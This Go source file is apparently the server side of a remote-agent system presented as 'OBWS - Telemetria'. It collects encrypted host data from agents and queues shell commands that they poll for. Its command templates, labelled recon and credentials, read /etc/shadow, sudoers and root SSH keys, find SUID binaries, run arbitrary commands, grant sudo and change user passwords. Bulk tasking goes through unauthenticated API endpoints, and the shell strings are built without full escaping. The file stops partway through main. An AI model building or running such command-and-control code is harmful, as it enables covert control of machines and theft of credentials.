package main

import (
	"crypto/ecdh"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/curve25519"
	"golang.org/x/crypto/nacl/box"
)

var privateKey *[32]byte
var db *sql.DB
var logger *log.Logger

type TelemetryRequest struct {
	Data string `json:"data"`
}

type TelemetryResponse struct {
	Status  string `json:"status"`
	Message string `json:"message,omitempty"`
}

type TelemetryRecord struct {
	ID         int64     `json:"id"`
	AgentID    string    `json:"agent_id"`
	RemoteAddr string    `json:"remote_addr"`
	Payload    string    `json:"payload"`
	ReceivedAt time.Time `json:"received_at"`
}

type Agent struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	LastIP   string `json:"last_ip"`
	LastSeen string `json:"last_seen"`
	OS       string `json:"os"`
	Kernel   string `json:"kernel"`
	CPUCores int    `json:"cpu_cores"`
	MemMB    int    `json:"mem_mb"`
	Disk     string `json:"disk"`
}

type Command struct {
	ID          int64  `json:"id"`
	AgentID     string `json:"agent_id"`
	Action      string `json:"action"`
	Params      string `json:"params"`
	Status      string `json:"status"`
	Result      string `json:"result"`
	CreatedAt   string `json:"created_at"`
	CompletedAt string `json:"completed_at"`
}

func initDB(dbPath string) error {
	os.MkdirAll(filepath.Dir(dbPath), 0755)

	var err error
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		return err
	}

	tables := []string{
		`CREATE TABLE IF NOT EXISTS telemetry (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT DEFAULT '',
			remote_addr TEXT NOT NULL,
			payload TEXT NOT NULL,
			received_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS agents (
			agent_id TEXT PRIMARY KEY,
			hostname TEXT DEFAULT '',
			last_ip TEXT DEFAULT '',
			last_seen DATETIME,
			os TEXT DEFAULT '',
			kernel TEXT DEFAULT '',
			cpu_cores INTEGER DEFAULT 0,
			mem_mb INTEGER DEFAULT 0,
			disk TEXT DEFAULT ''
		)`,
		`CREATE TABLE IF NOT EXISTS commands (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT NOT NULL,
			action TEXT NOT NULL,
			params TEXT DEFAULT '',
			status TEXT DEFAULT 'pending',
			result TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			completed_at DATETIME
		)`,
		`CREATE TABLE IF NOT EXISTS users (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
	}

	for _, t := range tables {
		if _, err := db.Exec(t); err != nil {
			return err
		}
	}

	// Migration: add agent_id column to telemetry if missing (pre-v2 schema)
	var colCount int
	db.QueryRow("SELECT COUNT(*) FROM pragma_table_info('telemetry') WHERE name='agent_id'").Scan(&colCount)
	if colCount == 0 {
		logger.Println("Migrando schema: adicionando agent_id a telemetry")
		db.Exec("ALTER TABLE telemetry ADD COLUMN agent_id TEXT DEFAULT ''")
	}

	_, err = db.Exec(`INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)`,
		"admin", "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi")
	return err
}

func loadPrivateKey(path string) error {
	pemBytes, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return fmt.Errorf("falha ao decodificar PEM")
	}

	keyAny, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		return err
	}

	var raw []byte
	switch k := keyAny.(type) {
	case *ecdh.PrivateKey:
		raw = k.Bytes()
	case []byte:
		raw = k
	default:
		return fmt.Errorf("tipo de chave inesperado: %T", keyAny)
	}
	var key [32]byte
	copy(key[:], raw)
	privateKey = &key
	return nil
}

func setupLogger(logPath string) error {
	os.MkdirAll(filepath.Dir(logPath), 0755)

	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return err
	}

	multi := io.MultiWriter(os.Stdout, f)
	logger = log.New(multi, "", log.Ldate|log.Ltime|log.Lshortfile)
	return nil
}

func upsertAgent(payload map[string]interface{}, remoteAddr string) {
	agentID, _ := payload["agent_id"].(string)
	if agentID == "" {
		return
	}

	hostname, _ := payload["hostname"].(string)
	osStr, _ := payload["os"].(string)
	kernel, _ := payload["kernel"].(string)
	disk, _ := payload["disk"].(string)

	var cpuCores int
	if v, ok := payload["cpu_cores"].(float64); ok {
		cpuCores = int(v)
	}
	var memMB int
	if v, ok := payload["mem_mb"].(float64); ok {
		memMB = int(v)
	}

	_, err := db.Exec(`
		INSERT INTO agents (agent_id, hostname, last_ip, last_seen, os, kernel, cpu_cores, mem_mb, disk)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(agent_id) DO UPDATE SET
			hostname=excluded.hostname,
			last_ip=excluded.last_ip,
			last_seen=excluded.last_seen,
			os=excluded.os,
			kernel=excluded.kernel,
			cpu_cores=excluded.cpu_cores,
			mem_mb=excluded.mem_mb,
			disk=excluded.disk
	`, agentID, hostname, remoteAddr, time.Now().UTC(), osStr, kernel, cpuCores, memMB, disk)
	if err != nil {
		logger.Printf("ERRO ao upsert agente %s: %v", agentID, err)
	}
}

func saveTelemetry(remoteAddr, payload string) (int64, error) {
	var agentID string
	var parsed map[string]interface{}
	if err := json.Unmarshal([]byte(payload), &parsed); err == nil {
		if id, ok := parsed["agent_id"].(string); ok {
			agentID = id
		}
	}

	res, err := db.Exec(
		"INSERT INTO telemetry (agent_id, remote_addr, payload, received_at) VALUES (?, ?, ?, ?)",
		agentID, remoteAddr, payload, time.Now().UTC(),
	)
	if err != nil {
		return 0, err
	}

	if agentID != "" {
		upsertAgent(parsed, remoteAddr)
	}

	return res.LastInsertId()
}

func queryTelemetry(limit int) ([]TelemetryRecord, error) {
	rows, err := db.Query("SELECT id, agent_id, remote_addr, payload, received_at FROM telemetry ORDER BY id DESC LIMIT ?", limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var records []TelemetryRecord
	for rows.Next() {
		var r TelemetryRecord
		if err := rows.Scan(&r.ID, &r.AgentID, &r.RemoteAddr, &r.Payload, &r.ReceivedAt); err != nil {
			return nil, err
		}
		records = append(records, r)
	}
	return records, nil
}

func queryTelemetryByAgent(agentID string, limit int) ([]TelemetryRecord, error) {
	rows, err := db.Query("SELECT id, agent_id, remote_addr, payload, received_at FROM telemetry WHERE agent_id = ? ORDER BY id DESC LIMIT ?", agentID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var records []TelemetryRecord
	for rows.Next() {
		var r TelemetryRecord
		if err := rows.Scan(&r.ID, &r.AgentID, &r.RemoteAddr, &r.Payload, &r.ReceivedAt); err != nil {
			return nil, err
		}
		records = append(records, r)
	}
	return records, nil
}

func listAgents() ([]Agent, error) {
	rows, err := db.Query(`SELECT agent_id, hostname, last_ip, last_seen, os, kernel, cpu_cores, mem_mb, disk FROM agents ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var agents []Agent
	for rows.Next() {
		var a Agent
		var lastSeen sql.NullString
		if err := rows.Scan(&a.AgentID, &a.Hostname, &a.LastIP, &lastSeen, &a.OS, &a.Kernel, &a.CPUCores, &a.MemMB, &a.Disk); err != nil {
			return nil, err
		}
		if lastSeen.Valid {
			a.LastSeen = lastSeen.String
		}
		agents = append(agents, a)
	}
	return agents, nil
}

func getCommandsByAgent(agentID string, status string) ([]Command, error) {
	var rows *sql.Rows
	var err error
	if status != "" {
		rows, err = db.Query("SELECT id, agent_id, action, params, status, result, created_at, completed_at FROM commands WHERE agent_id = ? AND status = ? ORDER BY id DESC", agentID, status)
	} else {
		rows, err = db.Query("SELECT id, agent_id, action, params, status, result, created_at, completed_at FROM commands WHERE agent_id = ? ORDER BY id DESC", agentID)
	}
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cmds []Command
	for rows.Next() {
		var c Command
		var completedAt, result sql.NullString
		if err := rows.Scan(&c.ID, &c.AgentID, &c.Action, &c.Params, &c.Status, &result, &c.CreatedAt, &completedAt); err != nil {
			return nil, err
		}
		if completedAt.Valid {
			c.CompletedAt = completedAt.String
		}
		if result.Valid {
			c.Result = result.String
		}
		cmds = append(cmds, c)
	}
	return cmds, nil
}

func listCommands(status string) ([]Command, error) {
	var rows *sql.Rows
	var err error
	if status != "" {
		rows, err = db.Query("SELECT id, agent_id, action, params, status, result, created_at, completed_at FROM commands WHERE status = ? ORDER BY id DESC LIMIT 100", status)
	} else {
		rows, err = db.Query("SELECT id, agent_id, action, params, status, result, created_at, completed_at FROM commands ORDER BY id DESC LIMIT 100")
	}
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cmds []Command
	for rows.Next() {
		var c Command
		var completedAt, result sql.NullString
		if err := rows.Scan(&c.ID, &c.AgentID, &c.Action, &c.Params, &c.Status, &result, &c.CreatedAt, &completedAt); err != nil {
			return nil, err
		}
		if completedAt.Valid {
			c.CompletedAt = completedAt.String
		}
		if result.Valid {
			c.Result = result.String
		}
		cmds = append(cmds, c)
	}
	return cmds, nil
}

func createCommand(agentID, action, params string) (int64, error) {
	params = formatParams(action, params)
	res, err := db.Exec(
		"INSERT INTO commands (agent_id, action, params, status) VALUES (?, ?, ?, 'pending')",
		agentID, action, params,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

// formatParams converts params from the admin panel format to the format bws agent expects.
// bws (shell script) expects JSON-like params for certain actions:
//
//	change_password → {"user":"...","password":"..."}   (admin sends: "user pass")
//	remove_user     → {"user":"..."}                     (admin sends: "user")
//	add_sudo        → {"user":"..."}                     (admin sends: "user")
//	exec            → params as-is (or {"command":"..."})
func formatParams(action, params string) string {
	switch action {
	case "change_password":
		parts := strings.SplitN(params, " ", 2)
		if len(parts) == 2 {
			return fmt.Sprintf(`{"user":"%s","password":"%s"}`, parts[0], parts[1])
		}
		return params
	case "remove_user", "add_sudo":
		if params != "" && !strings.HasPrefix(params, "{") {
			return fmt.Sprintf(`{"user":"%s"}`, params)
		}
		return params
	case "write_file":
		parts := strings.SplitN(params, " ", 2)
		if len(parts) == 2 {
			return fmt.Sprintf(`{"path":"%s","content":"%s"}`, parts[0], strings.ReplaceAll(parts[1], `"`, `\"`))
		}
		return params
	case "exec":
		if params != "" && params != "__template__" && !strings.HasPrefix(params, "{") {
			return fmt.Sprintf(`{"command":"%s"}`, strings.ReplaceAll(params, `"`, `\"`))
		}
		return params
	case "cat_file":
		return fmt.Sprintf(`{"command":"cat %s"}`, params)
	case "grep_search":
		return fmt.Sprintf(`{"command":"grep -rn '%s' /etc /root /home 2>/dev/null | head -30"}`, strings.ReplaceAll(params, `'`, `'\''`))
	}
	if params == "__template__" {
		return ""
	}
	return params
}

func getPendingCommands(agentID string) ([]Command, error) {
	return getCommandsByAgent(agentID, "pending")
}

func cancelCommand(id int64) error {
	_, err := db.Exec("UPDATE commands SET status='cancelled', completed_at=? WHERE id=? AND status='pending'",
		time.Now().UTC(), id)
	return err
}

func countCommandsByStatus(status string) (int, error) {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM commands WHERE status=?", status).Scan(&count)
	return count, err
}

func countTelemetry() (int, error) {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM telemetry").Scan(&count)
	return count, err
}

func countAgents() (int, error) {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM agents").Scan(&count)
	return count, err
}

func agentsOnline(hours int) ([]Agent, error) {
	since := time.Now().UTC().Add(-time.Duration(hours) * time.Hour)
	rows, err := db.Query(`SELECT agent_id, hostname, last_ip, last_seen, os, kernel, cpu_cores, mem_mb, disk FROM agents WHERE last_seen >= ? ORDER BY last_seen DESC`, since)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var agents []Agent
	for rows.Next() {
		var a Agent
		var lastSeen sql.NullString
		if err := rows.Scan(&a.AgentID, &a.Hostname, &a.LastIP, &lastSeen, &a.OS, &a.Kernel, &a.CPUCores, &a.MemMB, &a.Disk); err != nil {
			return nil, err
		}
		if lastSeen.Valid {
			a.LastSeen = lastSeen.String
		}
		agents = append(agents, a)
	}
	return agents, nil
}

func applyTemplate(action, params string) string {
	templates := map[string]string{
		// Recon
		"whoami":        "whoami",
		"id":            "id && whoami && groups",
		"uname":         "uname -a",
		"uptime":        "uptime",
		"hostname":      "hostname -f",
		"date":          "date -u",
		"last":          "last -10",
		"w":             "w",
		"users":         "users",
		"os_release":    "cat /etc/os-release 2>/dev/null | head -20",
		"env":           "env | sort",
		// Processes
		"ps":            "ps auxf",
		"ps_tree":       "ps auxf --forest",
		"top":           "top -b -n 1 | head -40",
		"proc_roots":    "ls -la /proc/*/exe 2>/dev/null | head -30",
		// Network
		"ip":            "ip a",
		"netstat":       "ss -tulpn 2>/dev/null || netstat -tulpn",
		"routes":        "ip route",
		"arp":           "ip neigh",
		"dns":           "cat /etc/resolv.conf",
		"connections":   "ss -tupn | head -30",
		"iptables":      "iptables -L -n -v 2>/dev/null | head -40",
		// Disk / Files
		"df":            "df -h",
		"mount":         "mount | head -30",
		"ls_root":       "ls -la /root/",
		"ls_tmp":        "ls -la /tmp/",
		"ls_etc":        "ls -la /etc/ | head -30",
		"ls_var_log":    "ls -la /var/log/ | head -30",
		"ls_home":       "ls -la /home/ 2>/dev/null",
		"find_suid":     "find / -perm -4000 -type f 2>/dev/null | head -30",
		"disk_usage":    "du -sh /* 2>/dev/null | head -20",
		// Credentials / Auth
		"passwd":        "cat /etc/passwd | head -50",
		"shadow":        "cat /etc/shadow 2>/dev/null | head -20",
		"sudoers":       "cat /etc/sudoers 2>/dev/null | head -30",
		"ssh_keys":      "ls -la /root/.ssh/ 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null | head -10",
		"ssh_logins":    "grep -i 'Accepted\\|Failed' /var/log/auth.log 2>/dev/null | tail -20",
		"lastlog":       "lastlog | head -20",
		// Software / Services
		"packages":      "dpkg -l 2>/dev/null | head -40 || rpm -qa 2>/dev/null | head -40",
		"services":      "systemctl list-units --type=service --state=running 2>/dev/null | head -30",
		"crontab":       "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
		"docker_ps":     "docker ps -a 2>/dev/null | head -20",
		// File operations
		"ls_recursive":  "find . -type f 2>/dev/null | head -50",
		"cat_file":      params,
		"grep_search":   params,
	// System operations
		"reboot":        "shutdown -r now",
		"poweroff":      "shutdown -h now",
	// Custom
		"exec":          params,
	}
	if params == "" || params == "__template__" {
		if cmd, ok := templates[action]; ok {
			return cmd
		}
	}
	return params
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	records, _ := queryTelemetry(5)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":       "ok",
		"message":      "backend obws rodando",
		"ultimos_dados": records,
	})
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"servico": "OBWS - Telemetria",
			"status":  "operacional",
			"uso":     "POST / com body base64 (ou JSON: {\"data\":\"<base64>\"})",
		})
		return
	}
	telemetryHandler(w, r)
}

func telemetryHandler(w http.ResponseWriter, r *http.Request) {
	remoteAddr := r.RemoteAddr

	if r.Method != http.MethodPost {
		json.NewEncoder(w).Encode(TelemetryResponse{
			Status:  "error",
			Message: "use POST com base64 diretamente no body",
		})
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "erro ao ler body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	rawStr := strings.TrimSpace(string(body))

	var decoded []byte
	if strings.HasPrefix(rawStr, "{") {
		var req TelemetryRequest
		if err := json.Unmarshal(body, &req); err == nil && req.Data != "" {
			rawStr = strings.TrimSpace(req.Data)
		}
	}

	decoded, err = base64.StdEncoding.DecodeString(rawStr)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(rawStr)
		if err != nil {
			http.Error(w, "base64 invalido", http.StatusBadRequest)
			return
		}
	}

	if len(decoded) < 56 {
		http.Error(w, "dados muito curtos", http.StatusBadRequest)
		return
	}

	var ephemeralPub [32]byte
	var nonce [24]byte
	copy(ephemeralPub[:], decoded[:32])
	copy(nonce[:], decoded[32:56])
	ciphertext := decoded[56:]

	var sharedSecret [32]byte
	curve25519.ScalarMult(&sharedSecret, privateKey, &ephemeralPub)

	plaintext, ok := box.OpenAfterPrecomputation(nil, ciphertext, &nonce, &sharedSecret)
	if !ok {
		http.Error(w, "falha na descriptografia", http.StatusBadRequest)
		return
	}

	payload := string(plaintext)

	id, err := saveTelemetry(remoteAddr, payload)
	if err != nil {
		logger.Printf("ERRO ao salvar telemetria: %v", err)
		http.Error(w, "erro ao salvar", http.StatusInternalServerError)
		return
	}

	logger.Printf("Telemetria recebida de %s | id=%d | payload=%s", remoteAddr, id, payload)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(TelemetryResponse{
		Status:  "ok",
		Message: fmt.Sprintf("dados recebidos (id=%d)", id),
	})
}

func pollHandler(w http.ResponseWriter, r *http.Request) {
	agentID := strings.TrimPrefix(r.URL.Path, "/poll/")
	if agentID == "" {
		http.Error(w, "agent_id obrigatorio", http.StatusBadRequest)
		return
	}

	cmds, err := getPendingCommands(agentID)
	if err != nil {
		logger.Printf("ERRO ao buscar comandos para %s: %v", agentID, err)
		http.Error(w, "erro interno", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	// bws agent expects: job_id, action, params (JSON array of objects)
	type PollCmd struct {
		JobID  int64  `json:"job_id"`
		Action string `json:"action"`
		Params string `json:"params"`
	}
	var result []PollCmd
	for _, c := range cmds {
		result = append(result, PollCmd{JobID: c.ID, Action: c.Action, Params: c.Params})
	}
	if result == nil {
		result = []PollCmd{}
	}
	json.NewEncoder(w).Encode(result)
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
	agentID := strings.TrimPrefix(r.URL.Path, "/result/")
	agentID = strings.TrimSuffix(agentID, "/")
	if agentID == "" {
		http.Error(w, "agent_id obrigatorio", http.StatusBadRequest)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "use POST", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "erro ao ler body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var resultData struct {
		CommandID int64  `json:"command_id"`
		JobID     int64  `json:"job_id"`
		Status    string `json:"status"`
		Result    string `json:"result"`
	}
	if err := json.Unmarshal(body, &resultData); err != nil {
		http.Error(w, "json invalido", http.StatusBadRequest)
		return
	}
	// bws agent sends job_id instead of command_id
	if resultData.CommandID == 0 && resultData.JobID != 0 {
		resultData.CommandID = resultData.JobID
	}
	if resultData.CommandID == 0 {
		http.Error(w, "command_id ou job_id obrigatorio", http.StatusBadRequest)
		return
	}

	now := time.Now().UTC()
	_, err = db.Exec(
		"UPDATE commands SET status = ?, result = ?, completed_at = ? WHERE id = ? AND agent_id = ?",
		resultData.Status, resultData.Result, now, resultData.CommandID, agentID,
	)
	if err != nil {
		logger.Printf("ERRO ao atualizar resultado do comando %d: %v", resultData.CommandID, err)
		http.Error(w, "erro ao salvar resultado", http.StatusInternalServerError)
		return
	}

	logger.Printf("Resultado recebido: comando %d do agente %s | status=%s", resultData.CommandID, agentID, resultData.Status)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func apiHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	path := strings.TrimPrefix(r.URL.Path, "/api/")
	path = strings.TrimSuffix(path, "/")
	parts := strings.Split(path, "/")

	if len(parts) == 0 || parts[0] == "" {
		json.NewEncoder(w).Encode(map[string]interface{}{
			"endpoints": []string{
				"GET  /api/agents",
				"GET  /api/agents/{id}",
				"GET  /api/agents/{id}/telemetry",
				"POST /api/command",
				"GET  /api/commands",
				"GET  /api/commands?status=pending&agent_id=X",
				"POST /api/commands/bulk",
				"POST /api/commands/cancel/{id}",
				"POST /api/commands/retry/{id}",
				"GET  /api/stats",
				"POST /api/profile",
			},
		})
		return
	}

	switch parts[0] {
	case "agents":
		if len(parts) >= 2 {
			agentID := parts[1]
			if len(parts) >= 3 && parts[2] == "telemetry" {
				records, err := queryTelemetryByAgent(agentID, 20)
				if err != nil {
					http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
					return
				}
				if records == nil {
					records = []TelemetryRecord{}
				}
				json.NewEncoder(w).Encode(records)
				return
			}
			var a Agent
			var lastSeen sql.NullString
			row := db.QueryRow("SELECT agent_id, hostname, last_ip, last_seen, os, kernel, cpu_cores, mem_mb, disk FROM agents WHERE agent_id = ?", agentID)
			if err := row.Scan(&a.AgentID, &a.Hostname, &a.LastIP, &lastSeen, &a.OS, &a.Kernel, &a.CPUCores, &a.MemMB, &a.Disk); err != nil {
				http.Error(w, `{"error":"agente nao encontrado"}`, http.StatusNotFound)
				return
			}
			if lastSeen.Valid {
				a.LastSeen = lastSeen.String
			}
			json.NewEncoder(w).Encode(a)
			return
		}
		agents, err := listAgents()
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
			return
		}
		if agents == nil {
			agents = []Agent{}
		}
		json.NewEncoder(w).Encode(agents)

	case "commands":
		// POST /api/commands/bulk — send command to multiple agents
		if len(parts) >= 2 && parts[1] == "bulk" {
			if r.Method != http.MethodPost {
				http.Error(w, `{"error":"use POST"}`, http.StatusMethodNotAllowed)
				return
			}
			var req struct {
				AgentIDs []string `json:"agent_ids"`
				Action   string   `json:"action"`
				Params   string   `json:"params"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				http.Error(w, `{"error":"json invalido"}`, http.StatusBadRequest)
				return
			}
			if len(req.AgentIDs) == 0 || req.Action == "" {
				http.Error(w, `{"error":"agent_ids e action obrigatorios"}`, http.StatusBadRequest)
				return
			}
			req.Params = applyTemplate(req.Action, req.Params)
			var ids []int64
			for _, aid := range req.AgentIDs {
				id, err := createCommand(aid, req.Action, req.Params)
				if err != nil {
					logger.Printf("ERRO ao criar comando para %s: %v", aid, err)
					continue
				}
				ids = append(ids, id)
			}
			logger.Printf("Bulk command: action=%s alvos=%d criados=%d", req.Action, len(req.AgentIDs), len(ids))
			json.NewEncoder(w).Encode(map[string]interface{}{
				"status":      "ok",
				"total":       len(req.AgentIDs),
				"created":     len(ids),
				"command_ids": ids,
			})
			return
		}
		// POST /api/commands/cancel/{id} — cancel pending command
		if len(parts) >= 3 && parts[1] == "cancel" {
			if r.Method != http.MethodPost {
				http.Error(w, `{"error":"use POST"}`, http.StatusMethodNotAllowed)
				return
			}
			var id int64
			if _, err := fmt.Sscanf(parts[2], "%d", &id); err != nil {
				http.Error(w, `{"error":"id invalido"}`, http.StatusBadRequest)
				return
			}
			if err := cancelCommand(id); err != nil {
				logger.Printf("ERRO ao cancelar comando %d: %v", id, err)
				http.Error(w, `{"error":"comando nao encontrado ou ja processado"}`, http.StatusBadRequest)
				return
			}
			logger.Printf("Comando cancelado: id=%d", id)
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
			return
		}
		// POST /api/commands/retry/{id} — re-create a failed/pending command
		if len(parts) >= 3 && parts[1] == "retry" {
			if r.Method != http.MethodPost {
				http.Error(w, `{"error":"use POST"}`, http.StatusMethodNotAllowed)
				return
			}
			var id int64
			if _, err := fmt.Sscanf(parts[2], "%d", &id); err != nil {
				http.Error(w, `{"error":"id invalido"}`, http.StatusBadRequest)
				return
			}
			var orig struct {
				AgentID string
				Action  string
				Params  string
				Status  string
			}
			err := db.QueryRow("SELECT agent_id, action, params, status FROM commands WHERE id=?", id).Scan(
				&orig.AgentID, &orig.Action, &orig.Params, &orig.Status)
			if err != nil {
				http.Error(w, `{"error":"comando nao encontrado"}`, http.StatusNotFound)
				return
			}
			newID, err := createCommand(orig.AgentID, orig.Action, orig.Params)
			if err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
			logger.Printf("Comando reenviado: old=%d new=%d agent=%s action=%s", id, newID, orig.AgentID, orig.Action)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"status":     "ok",
				"command_id": newID,
				"retry_of":   id,
			})
			return
		}
		// GET /api/commands?status=...&agent_id=...
		status := r.URL.Query().Get("status")
		agtID := r.URL.Query().Get("agent_id")
		var cmds []Command
		var err error
		if agtID != "" {
			cmds, err = getCommandsByAgent(agtID, status)
		} else {
			cmds, err = listCommands(status)
		}
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
			return
		}
		if cmds == nil {
			cmds = []Command{}
		}
		json.NewEncoder(w).Encode(cmds)

	case "command":
		if r.Method != http.MethodPost {
			http.Error(w, `{"error":"use POST"}`, http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			AgentID string `json:"agent_id"`
			Action  string `json:"action"`
			Params  string `json:"params"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error":"json invalido"}`, http.StatusBadRequest)
			return
		}
		if req.AgentID == "" || req.Action == "" {
			http.Error(w, `{"error":"agent_id e action obrigatorios"}`, http.StatusBadRequest)
			return
		}
		req.Params = applyTemplate(req.Action, req.Params)
		id, err := createCommand(req.AgentID, req.Action, req.Params)
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
			return
		}
		logger.Printf("Comando criado: id=%d | agente=%s | acao=%s", id, req.AgentID, req.Action)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":     "ok",
			"command_id": id,
		})

	case "stats":
		pending, _ := countCommandsByStatus("pending")
		completed, _ := countCommandsByStatus("completed")
		failed, _ := countCommandsByStatus("failed")
		totalAgents, _ := countAgents()
		online, _ := agentsOnline(24)
		telCount, _ := countTelemetry()
		json.NewEncoder(w).Encode(map[string]interface{}{
			"agents_total":   totalAgents,
			"agents_online":  len(online),
			"commands_total": pending + completed + failed,
			"commands_pending": pending,
			"commands_completed": completed,
			"commands_failed": failed,
			"telemetry_total": telCount,
		})

	case "profile":
		if r.Method != http.MethodPost {
			http.Error(w, `{"error":"use POST"}`, http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Action string `json:"action"`
			Data   string `json:"data"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error":"json invalido"}`, http.StatusBadRequest)
			return
		}
		switch req.Action {
		case "change_password":
			// username:newhash format
			parts := strings.SplitN(req.Data, ":", 2)
			if len(parts) != 2 {
				http.Error(w, `{"error":"formato invalido"}`, http.StatusBadRequest)
				return
			}
			_, err := db.Exec("UPDATE users SET password_hash=? WHERE username=?", parts[1], parts[0])
			if err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
			logger.Printf("Senha alterada para usuario: %s", parts[0])
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		default:
			http.Error(w, `{"error":"acao desconhecida"}`, http.StatusBadRequest)
		}

	default:
		http.Error(w, `{"error":"endpoint nao encontrado"}`, http.StatusNotFound)
	}
}

func eventsHandler(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming not supported", http.StatusInternalServerError)
		return
	}

	agentID := r.URL.Query().Get("agent_id")

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	lastCmdCount := -1
	lastTelCount := -1
	ctx := r.Context()

	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}

		var cmdCount int
		if agentID != "" {
			db.QueryRow("SELECT COUNT(*) FROM commands WHERE agent_id = ?", agentID).Scan(&cmdCount)
		} else {
			db.QueryRow("SELECT COUNT(*) FROM commands WHERE status = 'pending'").Scan(&cmdCount)
		}

		var telCount int
		if agentID != "" {
			db.QueryRow("SELECT COUNT(*) FROM telemetry WHERE agent_id = ?", agentID).Scan(&telCount)
		}

		if cmdCount != lastCmdCount || telCount != lastTelCount {
			lastCmdCount = cmdCount
			lastTelCount = telCount
			event := map[string]interface{}{
				"type":         "update",
				"cmd_count":    cmdCount,
				"tel_count":    telCount,
				"agent_id":     agentID,
				"timestamp":    time.Now().UTC().Format(time.RFC3339),
			}
			data, _ := json.Marshal(event)
			fmt.Fprintf(w, "data: %s\n\n", data)
			flusher.Flush()
		}
	}
}

func main() {
	if err := setupLogger("/var/log/obws/obws-server.log"); err != nil {
		log.Fatalf("Erro ao configurar log: %v", err)
	}

	if err := initDB("/var/lib/obws/obws.db"); err != nil {
		logger.Fatalf("Erro ao init DB: %v", err)
	}
	logger.Println("Banco SQLite inicializado")

	keyPath := "ws/server_x25519.key"
	if err := loadPrivateKey(keyPath); err != nil {
		logger.Fatalf("Erro ao carregar chave: %v", err)
	}
	logger.Println("Chave X25519 carregada com sucesso")

	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/health", healthHandler)
	http.HandleFunc("/poll/", pollHandler)
	http.HandleFunc("/result/", resultHandler)
